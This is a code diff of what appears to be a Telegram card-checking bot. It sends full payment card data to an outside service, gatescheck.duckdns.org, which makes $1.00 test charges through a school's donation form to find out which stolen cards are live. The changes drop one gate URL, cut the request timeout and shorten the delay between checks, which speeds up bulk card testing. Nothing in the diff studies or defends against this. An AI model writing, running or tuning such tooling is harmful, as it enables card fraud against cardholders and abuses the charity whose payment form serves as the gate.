@@ -27,8 +27,7 @@ user_tasks = {}
 # ------------------- Gates -------------------
 
 GATES = [
-    "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1",
-    "https://www.mgn1.org/events/"
+    "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"
 ]
 gate_index = 0
 api_semaphore = asyncio.Semaphore(6)
@@ -77,7 +76,7 @@ async def check_card_api(card_full):
     params = {"url": gate, "card": card_full, "amount": 1.00}
     async with api_semaphore:
         try:
-            async with httpx.AsyncClient(timeout=15) as client:
+            async with httpx.AsyncClient(timeout=4) as client:
                 r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
             result_raw = r.json().get('result', '')
             result = result_raw.lower()
@@ -208,7 +207,7 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 card_full = match[0]
                 start_time = time.time()
                 status, response = await check_card_api(card_full)
-                await asyncio.sleep(random.uniform(0, 2))
+                await asyncio.sleep(random.uniform(0, 1))
                 taken = round(time.time() - start_time, 2)
                 text = await format_response(card_full, status, response, taken)
                 if status == "approved":
